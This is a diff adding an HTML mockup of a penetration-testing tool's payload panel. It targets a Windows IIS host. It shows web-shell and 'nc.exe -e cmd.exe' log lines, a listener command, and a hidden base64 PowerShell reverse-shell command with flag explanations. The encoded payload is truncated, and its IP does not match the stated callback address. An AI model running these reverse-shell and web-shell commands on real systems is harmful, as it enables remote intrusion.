@@ -1,0 +1,31 @@
+<!doctype html><html><head><meta charset="utf-8"><link href="https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><style>
+*{box-sizing:border-box;margin:0}
+body{width:1440px;height:900px;overflow:hidden;background:#000;color:#e8e8e8;font:13px/1.45 "Instrument Sans",sans-serif}
+.mono{font-family:"JetBrains Mono",monospace}
+.mut{color:#a8a8a8}.fnt{color:#8a8a8a}.acc{color:#c6ff00}.warn{color:#e0a030}
+.lab{font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:#a8a8a8;font-weight:600}
+.chip{display:inline-grid;grid-auto-flow:column;gap:6px;align-items:center;border:1px solid #3a3a3a;border-radius:3px;padding:2px 8px;font-size:12px;white-space:nowrap}
+.pre{background:#0b0b0b;border:1px solid #1f1f1f;border-radius:4px;padding:10px 12px;font:12.5px/1.55 "JetBrains Mono",monospace;color:#fff;white-space:pre-wrap;overflow-wrap:anywhere}
+.btn{border:1px solid #3a3a3a;border-radius:4px;padding:4px 10px;font-size:12px;background:#0b0b0b;color:#e8e8e8}
+.btn.on{border-color:#c6ff00;color:#c6ff00}
+.kbd{border:1px solid #3a3a3a;border-radius:3px;padding:0 4px;font:10.5px "JetBrains Mono",monospace;color:#a8a8a8}
+.top{display:grid;grid-template-columns:auto 1fr auto auto auto;gap:14px;align-items:center;height:40px;padding:0 18px;border-bottom:1px solid #1c1c1c}
+.ok{color:#c6ff00}
+.flag{display:grid;grid-template-columns:150px 1fr;gap:10px;font-size:12.5px;padding:3px 0}
+.flag b{font:500 12px "JetBrains Mono",monospace;color:#fff}
+</style></head><body><div class="top"><b style="font-weight:600">Raven</b><span></span><span class="mut">Settings</span><span class="btn">Arsenal <span class="kbd">A</span></span><span class="btn on">Payloads <span class="kbd">P</span></span></div>
+<div style="display:grid;grid-template-columns:1fr 560px;height:860px">
+ <div style="padding:22px 28px;opacity:.55;display:grid;align-content:start;gap:14px"><h1 style="font-size:22px;font-weight:600">MS01 <span class="mono mut" style="font-size:14px">10.10.20.21</span></h1><div style="display:grid;grid-template-columns:1fr 1fr;gap:24px"><div style="display:grid;gap:8px"><span class="lab">Services</span><span class="mono">80 http Microsoft IIS 10.0</span><span class="mono">445 microsoft-ds</span><span class="mono">5985 wsman</span></div><div style="display:grid;gap:8px"><span class="lab">Log</span><span class="mono">14:02 GET /uploads/cmd.aspx?cmd=whoami</span><span class="mono">14:05 nc.exe -e cmd.exe … (no shell)</span></div></div></div>
+ <aside style="border-left:1px solid #2a2a2a;background:#0b0b0b;display:grid;grid-template-rows:auto auto 1fr auto">
+  <div style="display:grid;grid-auto-flow:column;justify-content:start;gap:4px;padding:12px 16px;border-bottom:1px solid #1c1c1c"><span class="btn on">Reverse shell</span><span class="btn">Transfer</span><span class="btn">msfvenom</span><span class="btn">Encode</span><span class="btn">Upgrade</span></div>
+  <div style="display:grid;gap:8px;padding:12px 16px;border-bottom:1px solid #1c1c1c"><div style="display:grid;grid-auto-flow:column;justify-content:start;gap:8px"><span class="chip">MS01 · Windows ⌄</span><span class="chip">web shell ?cmd= ⌄</span><span class="chip mono">:443 ⌄</span></div><span class="fnt" style="font-size:12px">From nmap (IIS 10) and your 14:02 log entry</span></div>
+  <div style="padding:14px 16px;display:grid;align-content:start;gap:12px">
+   <div><div class="lab">Best fit</div><div style="font-size:17px;font-weight:600;margin-top:3px">PowerShell, base64-encoded</div><span class="ok" style="font-size:12px">Fits: Windows, web shell parameter</span></div>
+   <div style="display:grid;gap:5px"><span class="lab">Listener</span><div class="pre">penelope -O -p 443</div></div>
+   <div style="display:grid;gap:5px"><span class="lab">Paste into ?cmd=</span><div class="pre">powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAyACIALAA0ADQAMwApAA==</div></div>
+   <div style="display:grid;gap:1px"><span class="lab" style="margin-bottom:3px">What each part does</span><div class="flag"><b>-nop</b><span class="mut">Skip the user profile: faster start, no profile scripts.</span></div><div class="flag"><b>-w hidden</b><span class="mut">No visible window on the target.</span></div><div class="flag"><b>-e &lt;base64&gt;</b><span class="mut">Runs the encoded command. Must be UTF-16LE base64; plain UTF-8 base64 silently fails.</span></div><div class="flag"><b>TCPClient(LHOST,443)</b><span class="mut">Calls back to 10.10.14.7 on 443, chosen as egress-safe.</span></div></div>
+   <div class="fnt">Also fits: powercat via IEX · 1 doesn't fit: show</div>
+  </div>
+  <div style="border-top:1px solid #1c1c1c;padding:8px 16px;font-size:11px" class="mut"><span class="kbd">↵</span> copy payload · <span class="kbd">⌥L</span> copy listener · <span class="kbd">⇥</span> next fit · <span class="kbd">⌥1-5</span> generator · <span class="kbd">Esc</span> close</div>
+ </aside>
+</div></body></html>
